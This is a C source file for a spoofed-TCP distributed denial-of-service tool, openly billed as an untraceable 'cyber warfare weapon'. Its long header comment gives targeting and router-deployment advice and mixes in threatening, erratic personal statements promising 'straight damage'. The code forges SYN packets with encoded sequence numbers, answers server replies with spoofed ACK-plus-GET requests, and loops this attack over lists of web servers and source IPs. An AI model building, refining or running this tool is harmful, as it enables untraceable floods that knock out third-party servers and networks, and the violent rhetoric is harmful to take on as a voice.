/*
DDoS 2.0 - Merry X-Mas
This will be ready to go cyber warfare weapon which is fully untracable, and impossible to filter.

The point of this is to go from 30,000 connections a minute to as many as possible.  I will attempt to make this as small and concise as possible... I'd like it to be
modular enough to work diretly in routers.  It can have the option branching off the packet sending to other boxes keeping things minimum on routers, and it should
work fine.

A lot of the packets can be automatically determined thus only one single SEQ from remote webserver is really required.  One connection to the webserver along with that
seq will give us a roadmap for every following connection of the same request, and if the web server is using PSH which most are... itll send back the entire response.
example:
Seq (or ACK if remote side) increases by the size, and on some TCP/IP flags by one.. the same request will affect the SEQ by the same amount if done equally...
the remote side will send back a full response, and even further packets  regardless of receiving anymore proper SEQs so if the remote side has somme dynamic scrits
such as PHP, etc.. and its SEQ cannot be foreseen.. its already too late and the damage is done.  This is why only a SINGLE SEQ (initial) is required.  The burden
is decreased greatly because of this.  Quantum inserts entire framework could be weaponized worldwide immediately today due to their infrastructure already beign in
place, etc.

Do not fear.  A lot of other companies, ISPs, etc all have networks with passive monitoring that you can hack so you can be a world class cyber warrior as well.

The games are no longer just for the NSA.  I bring you fun.  DDoS 2.0.

Impossible to firewall, impossible to trace... just pure cyber warfare.


1 simulated connection using the same data will give us a list of how we expect the packets to these servers to respond (just in case their tcp/ip protocol varies
a tiny bit)...
what we need?
every packets SEQ/ACK fromm both sides, and the sizes
since HTTP doesnt require the remote side to give ANy data abefore we send our request, and itll respond immediately... 
unless our request is bigger than 1 window (1500)  then itll prob be 100% no issues

oh wow.. ipv6 is another thing entirely.. it takes a simplle attack, and allows destroying networks with smalller networks.. insane.
the more IPs is better for connectivity but extremely tough for firewalling, etc



very expensive rape huh?  the damages will not  be known for a long time.. like i mentioned  in my fax to congress... still think these rapists will walk away?
im far fromm done.. no more demonstration just straight damage. alrighty.. i was drugged 4 days ago.. dont blame anyone but all of yourselves.
I bet in the future you don't take me as doing nothing as the end of things.  Its called strategy. I just wanted to ensure nobody would be left.

and they say you have to join, and wait to be on the inside to destroy something/someones way.. im pretty sure ill have everyone out of the way before
that option ever arrives.



version 2-----

Two nodes, or a helper server can monitor and keep track of port 80 requests (somme) and autoatically check,and add them to a list
which would populate the system in a way where it would require zero people to perform massive attacks.. it would auto configure
itself, and know which IPs are useful without anyone ever  updaating, or modifying the system

automation at its best.




-----
in my tests there is a certain timing that is almost perfect.. which means more testing needs to take place.. an automated verification of each router/passive monitor and the
attacks its building can be made to perform the attacks.. its  probably just the TCP/IP engine, and it sending another retransmission if it does/doesnt receive a packet in time
i w as able  to get the new system with SEQ up to 30k (which  means the other system should work at 60k) but when I fixed somme bugs(slow downs, etc) in the packet system for 
sending/recv the connections overall requests dropped.. im assuming it became too fast... also this is slower than the other becausde it doesnt CLOSE connections...
on a masasive  router you do noot wanna close every connecction.. now that  we are down to 2 packets especially... anyways
ill try to work out the magic timings and then it can be built into an initial phase which tests all web servers before performing full blown attacks

side note: all of the 50% ones that were 200 respoonse but 0 bytes ini the http logs.. those were RESET connections.. so even without scanning properly, and finding/filtering RST
the attacks are stil 50% succesful.. so .. the attack is still massively plausable without even doing due dilligence and things propery...
so the attack can be used immediately with barely any preparation, or filtering..


whether or not RST packets are good, or bad depends on the web server...
for apache: blocking RST packets is good..
for NGINX it seems to be bad.. however i think if sending precalculated ACKS then it should function ok depending on the web servers load anfd how it fragments packets.. i believe itll all be equal
majority of time for these small packets
!!! todo: SEQ analysis to determine over an attack how the load changes

nginx seems to perform some socket action which kills the  webserver completely if the attack is performed... it might be some way to destroy an nginx server with just a single machine
due to the way it functions w the tcp/ip stack.. it happens before the page is returned.. and it shows as a 500 error in the error log


apache doesnt seem to deal w that bug the same.. maybe its not a bug as much as just the configuration.. anywaays it seems to work as fast as the web server can process

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <stdint.h>
#include <netinet/ip6.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp6.h>  
#include <arpa/inet.h>
#include <stddef.h>
#include "network.h"
#include "antisurveillance.h"
#include "packetbuilding.h"
#include "research.h"
#include "utils.h"
#include "identities.h"
#include "scripting.h"
#include "network_api.h"
#include "instructions.h"
#include <math.h>
#include "cyberwarfare.h"


int range = 60000;

// the seq is split up by bits to contain information to help us determine whether it was generated by us
// for an attack.. this removes need for holding information  in memory..
// and allows processing for far more attack packets from routers directly..
// and it may allow (for groups with enough funding) to implement inline firewalling to block the RST packets
// which  would allow performing the attack on ANY ip (not just ones you verify against cyberwar_findips)
typedef struct _seq_oracle {
    unsigned char time_a : 4;
    unsigned char time_b : 4;
    unsigned short ip : 8;
    unsigned short port : 8;
    unsigned short chk : 8;
} SequenceOracle;

typedef union {
    SequenceOracle bits;
    uint32_t full;
} Oracle;


// if we ONLY monitor for SYN+ACK AND pass this... regardless of some time warp it shoould still function properly..
// a better version can be done but im just winging this to get it released quickly... it wont take long to redo
// keeping this.. will prob do a libnet/libpcap version so people can use immediately tomorrow
int packet_filter(uint32_t seq, uint32_t ip, unsigned short port, uint32_t ts, uint32_t *gen) {
    Oracle xyz;
    int i = 0;

    xyz.full = 0;
    xyz.bits.ip = ((ip % 1024) & 0x000000ff);
    xyz.bits.port = (port & 0x000000ff);
    xyz.bits.chk = ((xyz.bits.ip + xyz.bits.port) & 0x000000ff);

    if (gen)
        ts += 1;
    else
        ts -= 1;

    for (i =0; i < 5; i++) {
        xyz.bits.time_a = ((ts + i) / 2) & 0x0000000f;
        xyz.bits.time_b = ((ts + i) % 2) & 0x0000000f;

        // this allows us to generate the SEQUENCE for outgoing packets...
        if (gen != NULL) {
            *gen = xyz.full;
            return 1;
        }

        if (xyz.full == seq) return 1;

    }

    return 0;
}

// determine if a packet was sent by us, or a helper box which is initiating all attacks...
// this will keep minimal CPU usage... these few mathematics are much more efficient than doing linked lists, or arrays
// This design resets every 30 seconds.. its enough time for new packets to become discarded.. and considering we only monitor for SYN+ACK..
// Its win win
int FilterIsOurPacket(PacketBuildInstructions *iptr) {
    Oracle xyz;
    int i = 0;
    
    // first check to weed out bad is high source port
    if ((iptr->destination_port < range) || (iptr->destination_port > (range+5000))) return 0;

    // first we ensure its SYN|ACK
    if (!(iptr->flags & TCP_FLAG_SYN) && (iptr->flags & TCP_FLAG_ACK)) return 0;

    // now we use the addresses to create a small magic sequence like a checksum.. and itll
    // tell us if the packet is infact our attacks
    if (packet_filter(iptr->ack, iptr->destination_ip, iptr->destination_port, iptr->ts, NULL)) return 1;

    return 0;
}



/*
first we will use my network API ... and then modify it to make it standalone for routers
ill try to implement fully on Bro IDS just to show exampes of using..... with a single router exploit
this could be automatically installed on mass routers worldwide preparing for use...
remember.. if on passive taps, or major ISPs... its 100% untracable depending on your TTL
*/
PacketBuildInstructions *CW_BasePacket(uint32_t src, int src_port, uint32_t dst, int dst_port, int flags) {
    PacketBuildInstructions *bptr = NULL;

    // generate ACK packet to finalize TCP/IP connection opening
    if ((bptr = (PacketBuildInstructions *)calloc(1, sizeof(PacketBuildInstructions))) == NULL)
        return NULL;

    bptr->type = PACKET_TYPE_TCP;
    bptr->flags = flags;

    bptr->tcp_window_size = 1500 - (20*2+12);
    bptr->ttl = 64;

    // ipv4..
    bptr->type |= PACKET_TYPE_TCP_4 | PACKET_TYPE_IPV4;
    bptr->source_ip = src;
    bptr->destination_ip = dst;
    //!!! ipv6

    bptr->source_port = src_port;
    bptr->destination_port = dst_port;

    return bptr;
}




/*
1: SYN seq:0 ack:0

This is the ONLY packet we care about... the rest is calculated.  
2: SYN,ACK seq:0 ack:1

3: ACK seq:1 ack:1
4: Request (GET / fjdofjofjd)  ack:1 seq:1

3 & 4 are both ours, and possibly can be turned into a single PACKET.. but always can be a single transmission.. ill check into single packet but for now who cares
maybe  not if the tcp/ip protocols dont process it the same until its literallly activated
--- everything below is irrelevant --
5: ACK
6: DATA 200 OK...
7: DATA1 <HTML>
8: DATA2 .... 
etc..etc... 
.....
15:PSH,FIN,ACK </HTML>
16:FIN,ACK
17:ACK
--- end of connection

As you can see.. the first four packets are the only which matter.  The rest are irrelevant, and actually... The 3rd, and 4th can be sent practically
together.  The good thing about this is... we only have to process a single source port one time per connection.  The limitation of not closing connections
properly is that if we are attacking using some service such as google then there is a 5 minute timeout for all 65535 ports.. not a huge limitation. I doubt
it'l eever matter since this is just a SINGLE web server when we can target many many more.  If done properly, and timed correctly
we can pick and choose our source ports, and sequence numbers for our side by timing (literally time(0)) because this means we will completely ignore
all future packets fromm connections we are establishing without ever processing it purely by a simple checksum, and the timing.. in reality
if we only allow things that match the current time (if we limit it to 1.5-2 seconds) then nothing beyond that window will even reach our code.

This is a substantial speed increase from my virtual tcp/ip stack which required verifying everything.  I hope I can test it on a local vmware tomorrow...

epoch  can be virtualized and  modulated by years, then months/weeks, days, and then hours, minutes and into seconds.. then we can create tcp/ip slices (windows)
and generate our SEQs using this so that whenever the target web servers respond we then generate immediately the 2 packets  its expecting... the remote side should
process them in order and worse case we put a small delay on the outgoing queue but we never allow those same SEQ, or source port for the next slice..
therefore the  algorothm is constantly choosing/changing

this is the fastest i ve comme up with somme far to handle this situation

4 bits = var 1 (secs/2)
4 bits = secs 5 2 (time slice in minute)
8 bits = ip modular (% 65535)
16 bits = source port+checksum

souurce port > 32000 (to cut 16 bits into 8)  (can swap between high/low every few minutes).. or can use % 2 (to mix up high/low in between)
src port > 0x0000ffff

checksum = a+b * src

// algorithm for seq (ver 1)
seq = [4 bits:var_1][4 bits:var_2][8 bits: ip % 0xffff][4:src - 0xffff0000][4: (var_1+var_2*(src&0x0000ffff))]

thats the whole application right here..
time to finish code, clean it up.. and also attempt to find main routers onlines code so i can integrate it or at least have a practically ready to go system
for anyone to begin testing...

trust me.. it works.

int filter_packet(PacketBuildInstructions *iptr) {

    seq_<bits><a-e>
unsigned char seq_4a = secs / 2;
unsigned char seq_4b = secs % 2;
unsigned short seq_8c = iptr->source % 0xfffff;
unsigned short seq_8d = (iptr->source_port & 0x0000fffff);
unsigned short checksum = (seq_4a+seq_4b)*(seq_8d&0x0000fffff);
unsigned short seq_8e = checksum;

if (iptr->source_port < 0xffff) return 0;


return 1;

for pre-generation attack packeets ahead of time (so we can queue with different processors, or cards, or boxes to distribute them out)
instead of using queue with timers.. and  loops.. we can put the delay till the next packet, or section directly into the array itself
so its a single stream (but must test output buffer ability)


time slices of a single second should be fine for the entire operation... any host that are slower we probably wont use for attacks, although it may be plausible
to increase time slice over time depending on amount of IPs being pushed to the web server
*/

// to find either web servers which respond in an area for targeting some IP...
// so it goes liek this: we need to choose some IP we have access to for either attacking, or receiving the attack
// either side needs to be on one side of the passive tap
// if we are at a big backbone somewhere, or an ISP router then we can use virtually all traffic without being directly inside of boxes in that network...
// up to the services we are spoofing (http is most effective for this right now for this example) but is limited by X connections per server
// we can always just find more IPs that pass through the router...passive monitors which employ quantum insert could essentially
// manipulate, and give that SEQ (one single packet we need to perform the spoofed HTTP request) for a lot of IPs

// okk so leets say you want to attack some datacenter in miami to knock some service offline..
// takke the range, and scan with it to a  webserver under your control.. the scan shoudl spoof packets fromm that service, and you should be under control of a router
// either around the web servers your spoofing the connection to, or near the place your attacking (either way is untracable)
// as long as you can get that single SEQ you are good to go for but this we need to find dead IPs which will not respond with RST whenever they receive packets
// foro things they have not had anything to do with
// so for now the whole concept is TO send them  SYN/ACK packets and monitor for their RST to gather IPs under their ranges which are acceptable spoofing IPs
// without having to worry about another mechanism i use
// it does mean that a form of quick protection is to respond with RST, but you could also include a firewall in the rouuters passing the traffic to filter this
// by specific SEQ/source ports which will not be passed through
// once you have the IP list.. then those aree the IPs you rotate for this attack.. and depending  on where you are located to get the SEQ
// you can rotate web servers as well (unless you are  only monitoring an isp with  major web traffic then you have  to pick ranges on their network specifically)
// to the web traffic itll look like real requests fromm the clients, and  to them they'll see the packets comming  back and not understand why initially
// the person receiving the transmissions will assume they are  being hacked.. nobody will really knnow whats going on .. for awhile anyways
// manipulate TTL to push concepts away fromm the routers


// for now we will use my network.c but it should be easy to modify incoming to receive all packets which match a criteria later...
int Cyberwarefare_DDoS_Init(AS_context *ctx) {
    int ret = -1;
    NetworkAnalysisFunctions *nptr = NULL;
    FilterInformation *flt = NULL;


    // lets prepare incoming ICMP processing for our traceroutes
    if ((flt = (FilterInformation *)calloc(1, sizeof(FilterInformation))) == NULL) goto end;

    // initialize w empty filter.. we want everything.
    FilterPrepare(flt, 0, 0);

    // now lets change the filter...
    // lets specify SYN/ACK for filter.. its not in the API yet.. it was added last
    // ill just do it manually like this
    flt->flags |= FILTER_PACKET_FLAGS;
    flt->packet_flags |= TCP_FLAG_SYN|TCP_FLAG_ACK;

    // clear other hooks
    ctx->IncomingPacketFunctions = NULL;

    // add into network subsystem so we receive all packets
    if (Network_AddHook(ctx, flt, &Cyberwarefare_Incoming) != 1) goto end;

    ret =  1;

    end:;
    return ret;
}


int Cyberwarfare_SendAttack1(AS_context *ctx, uint32_t src, uint32_t dst, int ts, OutgoingPacketQueue **optr) {
    uint32_t magic_seq = 0;
    PacketBuildInstructions *bptr = NULL;
    int src_port = range + rand()%5000;
    
    // build magic SEQ so we dont have to keep track of connections.. (golden for executing this attack from massive gbps routers)
    packet_filter(0, src, src_port, ts, &magic_seq);

    // build packet for opening connection to initiate the attack
    bptr = CW_BasePacket(src, src_port, dst, 80, TCP_FLAG_SYN|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);

    if (bptr) {
        bptr->seq = magic_seq;
        bptr->ack = 0;
        bptr->header_identifier = rand()%0xffffffff;

        NetworkQueueInstructions(ctx, bptr, optr);

        //if (optr) OutgoingQueueLink(ctx, optr);

        PacketBuildInstructionsFree(&bptr);
        return 1;
    }

    return 0;
}

// this sends the request to the http server from the ip adddress.. all information required is already in the packet itself.. no need to keep track of anything.
int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
    PacketBuildInstructions *bptr = NULL;
    uint32_t header = rand()%0xffffffff;
    OutgoingPacketQueue *optr = NULL;

    // we only neeed the data we are going to respond to..
    // ANY server sending us ACK+SYN which matches our magic seqeuence identifiers will have this data sent to it...
    // in memory space is extremely small.. doable for any router.
    // this mainly has to contain "GET / HTTP/1.0\r\n\r\n" until people begin blocking it... or you'd like to hit a bigger URL under a ServerHost
    char req_data[] = "GET / HTTP/1.0\r\n\r\n";
    int req_data_size = sizeof(req_data);

/*

    // WOW.. at it goes you dont even need 2 packets to perform the attack.. just a single.. ACK+Request in same packet is enough.

    // SEQ analysis of products may allow these attackss to take place with only a few initial connections to load balancers..
    // thus allowing using any load balancers of the same types to produce attacks.. not sure how acccurate.. depending on their initial seq
    
    
    // build ACK for the servers SYN|ACK
    bptr = CW_BasePacket(iptr->destination_ip, iptr->destination_port, iptr->source_ip, iptr->source_port, TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
    if (!bptr) return 0;    
    bptr->seq = iptr->ack;
    bptr->ack = iptr->seq;
    bptr->header_identifier = header++;

    // put in queue for wire
    NetworkQueueInstructions(ctx, bptr, &optr);

    // free first packet
    PacketBuildInstructionsFree(bptr);
*/
    // now build packet for http request (GET .....)
    bptr = CW_BasePacket(iptr->destination_ip, iptr->destination_port, iptr->source_ip, iptr->source_port, TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
    if (!bptr) return 0;    
    bptr->seq = iptr->ack;
    bptr->ack = iptr->seq;
    bptr->header_identifier = header++;

    // obviously this can be optimized to not need to be replicated.. but it would breakk other things..
    // besides this has to be redesigned for a router.. etc.. its showing a full example of how it works.
    // for massive attacks. take your  top 3 coders and spend a single day.. it doesnt take long once you have
    // the packet access...
    bptr->data = &req_data;
    bptr->data_size = req_data_size;
    bptr->data_nofree = 1;

    // put in queue for wire
    NetworkQueueInstructions(ctx, bptr, &optr);
    
    // push both to wire
    if (optr) OutgoingQueueLink(ctx, optr);
    
    // free 2nd packet
    PacketBuildInstructionsFree(bptr);

    return 1;
}




// all packets reacch this function so that we can determine if any are for our network stack
int Cyberwarefare_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
    int ret = 0;

    // we need to analyze the current time, source ports, and then determine if its for an attacak
    // the timme slice should invalidate.. and this should get moved directly after reading fromm network kdevice
    if (FilterIsOurPacket(iptr)) {
        Cyberwarfare_SendAttack2(ctx, iptr);
        ret = 1;
    }

end:;
    return ret;
}



// this sends the initial syn packets to the web server fromm each IP...
// it does not handle logic of what side of passive tap, or whatever.. it expects  all that to be worked out ahead of time
void start_attack(AS_context *ctx) {
    char *tags[] = { "A1", "00", NULL };
    int web_i = 0, req_i = 0, start = 0, count = 0;
    IPAddresses *webservers = NULL;
    IPAddresses *requesters = NULL; 
    int ts = 0;
    OutgoingPacketQueue *optr = NULL;
    int fast = 1;
    int skip = 0;
    int out_count = 0;

    webservers = IPAddressesPtr(ctx, tags[0]);
    requesters = IPAddressesPtr(ctx, tags[1]);

    while (1) {
        ts = time(0);
        if (!skip) {
            for (web_i = 0; web_i < webservers->v4_count; web_i++) {
                for (req_i = 0; req_i < requesters->v4_count; req_i++) {
                    out_count += Cyberwarfare_SendAttack1(ctx, requesters->v4_addresses[req_i], webservers->v4_addresses[web_i], ts, &optr);
                    if (fast) {//} && out_count++ > 100) {
                        OutgoingQueueLink(ctx, optr);
                        AS_perform(ctx);

                        // this SHOULDNT add too much overhead.. since it only processes whats waiting (not reading for more)...
                        // ill test somme more without it and  see if it hurts/helps
                        //network_process_incoming_buffer(ctx);

                        optr = NULL;
                        //out_count = 0;
                    }
                }
            }
        } else {
            skip--;
            
        }

        // push packets as quickly as possible if it takes more  than 1 second to send them all... otherwise our magic SEQ falls out of its time slice
        //if ((time(0) - ts) > 1) fast=1;

        // push all packets together
        if (!fast && optr) {
            OutgoingQueueLink(ctx, optr);
            optr = NULL;
        }

        AS_perform(ctx);
        network_process_incoming_buffer(ctx);

        // this has to be adjusted.. a better system to limit needs to be in place.. not yet
        if (!(count++ % 500)) skip = 5;
        //sleep(10);
    }

    //pthread_exit(0);
}

int main(int argc, char *argv[]) {
    AS_context *ctx = Antisurveillance_Init(0);
    int i = 0, r = 0;
    int bad = 0;
    pthread_t attack_thread_handle;
    char *files[] = { "webservers", "requesters", NULL };
    char *tag[] = { "A1", "00", NULL };
    
    
    if (argc == 2) {
        i = atoi(argv[1]);
        if ((i < 1) && (i > 32)) i = 1+rand()%20;
        range = i * 2000;
        srand(time(0) + range);
    }

    if (ctx == NULL) {
        printf("coouldnt initialize new context\n");
        exit(-1);
    }

    // open and turn both files into IPaddress lists
    i = 0;
    while (files[i] != NULL) {
        r = file_to_iplist(ctx, files[i], tag[i]);

        // if it failed.. bad=1
        if (r <= 0) { 
            printf("failedd to load %s [%s]\n", tag[i], files[i]);
            bad = 1;
            break;
        }

        i++;
    }

    if (bad) {
        fprintf(stderr, "cannot load necessary data.. \n");
        exit(-1);
    }

    ctx->queue_buffer_size = 1024*1024;
    ctx->queue_max_packets = 100;


    Module_Add(ctx, &Cyberwarefare_DDoS_Init, NULL);



    printf("beginning attack..\n");

    start_attack(ctx);

    exit(0);
}